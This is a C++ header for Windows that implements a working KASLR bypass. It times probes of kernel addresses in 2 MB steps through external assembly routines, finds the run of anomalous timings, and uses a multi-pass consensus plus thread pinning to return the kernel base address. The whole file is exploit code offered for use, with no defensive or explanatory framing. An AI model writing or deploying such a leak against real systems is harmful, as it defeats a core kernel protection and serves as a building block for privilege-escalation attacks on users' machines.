#pragma once

#include <algorithm>
#include <concepts>
#include <cstddef>
#include <cstdint>
#include <expected>
#include <functional>
#include <limits>
#include <memory>
#include <optional>
#include <ranges>
#include <span>
#include <vector>

#ifndef NOMINMAX
#   define NOMINMAX
#endif
#ifndef WIN32_LEAN_AND_MEAN
#   define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>


extern "C"
{
    std::uint64_t kaslr_probe(const void* addr) noexcept;
    void          kaslr_poke()                  noexcept;
}


namespace kaslr
{
    enum class status : std::uint8_t
    {
        ok        = 0,
        no_signal = 1,
        unstable  = 2,
    };

    using base_t = std::uintptr_t;
    using result = std::expected<base_t, status>;

    namespace detail
    {
        inline constexpr base_t        scan_lo   = 0xFFFF'F800'0000'0000ULL;
        inline constexpr base_t        scan_hi   = 0xFFFF'F808'0000'0000ULL;
        inline constexpr std::uint64_t stride    = 0x20'0000ULL;
        inline constexpr std::size_t   slots     = (scan_hi - scan_lo) / stride;

        inline constexpr std::size_t   samples   = 24;
        inline constexpr std::size_t   warmup    = 2;
        inline constexpr std::size_t   passes    = 9;
        inline constexpr std::size_t   quorum    = 3;
        inline constexpr std::size_t   min_run   = 8;
        inline constexpr std::size_t   slack     = 4;

        inline constexpr std::uint64_t dev_num   = 1;
        inline constexpr std::uint64_t dev_den   = 14;

        inline void sweep(std::span<std::uint64_t> out) noexcept
        {
            std::ranges::fill(out, std::numeric_limits<std::uint64_t>::max());

            for (std::size_t s = 0; s < samples + warmup; ++s)
            {
                for (std::size_t i = 0; i < out.size(); ++i)
                {
                    const auto va = reinterpret_cast<const void*>(scan_lo + i * stride);

                    kaslr_poke();
                    const auto t = kaslr_probe(va);

                    if (s >= warmup && t < out[i])
                        out[i] = t;
                }
            }
        }

        [[nodiscard]] inline std::uint64_t
        median(std::span<const std::uint64_t> in) noexcept
        {
            std::vector<std::uint64_t> tmp(in.begin(), in.end());
            const auto mid = tmp.begin() + std::ssize(tmp) / 2;
            std::ranges::nth_element(tmp, mid);

            return *mid;
        }

        struct band
        {
            std::size_t start  = 0;
            std::size_t length = 0;
        };

        template <std::predicate<std::uint64_t> Pred>
        [[nodiscard]] inline band
        longest_run(std::span<const std::uint64_t> data, Pred&& pred) noexcept
        {
            band best{};
            band cur {};

            for (std::size_t i = 0; i < data.size(); ++i)
            {
                if (std::invoke(pred, data[i]))
                {
                    if (cur.length == 0)
                        cur.start = i;
                    ++cur.length;
                    if (cur.length > best.length)
                        best = cur;
                }
                else
                {
                    cur = {};
                }
            }
            return best;
        }

        [[nodiscard]] inline std::optional<std::size_t>
        pick(std::span<const std::uint64_t> data) noexcept
        {
            const auto m   = median(data);
            const auto eps = m * dev_num / dev_den;
            const auto lo  = m - eps;
            const auto hi  = m + eps;

            if (const auto fast = longest_run(data, [lo](auto v) { return v < lo; });
                fast.length >= min_run)
                return fast.start;

            if (const auto slow = longest_run(data, [hi](auto v) { return v > hi; });
                slow.length >= min_run)
                return slow.start;

            return std::nullopt;
        }

        [[nodiscard]] inline std::optional<std::size_t>
        consensus(std::span<std::size_t> picks) noexcept
        {
            std::ranges::sort(picks);

            std::size_t winner = 0;
            std::size_t votes  = 0;

            for (std::size_t i = 0; i < picks.size(); ++i)
            {
                std::size_t v = 0;
                for (std::size_t j = i; j < picks.size() && picks[j] - picks[i] <= slack; ++j)
                    ++v;

                if (v > votes)
                {
                    votes  = v;
                    winner = picks[i];
                }
            }

            return votes >= quorum ? std::optional{ winner } : std::nullopt;
        }

        class steady_scope
        {
        public:
            steady_scope() noexcept
                : thread_   { ::GetCurrentThread() }
                , prior_    { ::GetThreadPriority(thread_) }
                , prev_mask_{ ::SetThreadAffinityMask(thread_, current_cpu_mask()) }
            {
                ::SetThreadPriority(thread_, THREAD_PRIORITY_TIME_CRITICAL);
            }

            ~steady_scope()
            {
                ::SetThreadPriority(thread_, prior_);
                if (prev_mask_) ::SetThreadAffinityMask(thread_, prev_mask_);
            }

            steady_scope           (const steady_scope&) = delete;
            steady_scope& operator=(const steady_scope&) = delete;

        private:
            static DWORD_PTR current_cpu_mask() noexcept
            {
                return DWORD_PTR{ 1 } << ::GetCurrentProcessorNumber();
            }

            HANDLE    thread_;
            int       prior_;
            DWORD_PTR prev_mask_;
        };
    }

    [[nodiscard]] inline result leak() noexcept
    {
        using namespace detail;

        steady_scope guard;

        auto       buffer = std::make_unique_for_overwrite<std::uint64_t[]>(slots);
        std::span  timings{ buffer.get(), slots };

        std::vector<std::size_t> picks;
        picks.reserve(passes);

        for (std::size_t p = 0; p < passes; ++p)
        {
            sweep(timings);
            if (const auto c = pick(timings))
                picks.push_back(*c);
        }

        if (picks.empty())
            return std::unexpected{ status::no_signal };

        const auto winner = consensus(picks);
        if (!winner)
            return std::unexpected{ status::unstable };

        return scan_lo + *winner * stride;
    }
}
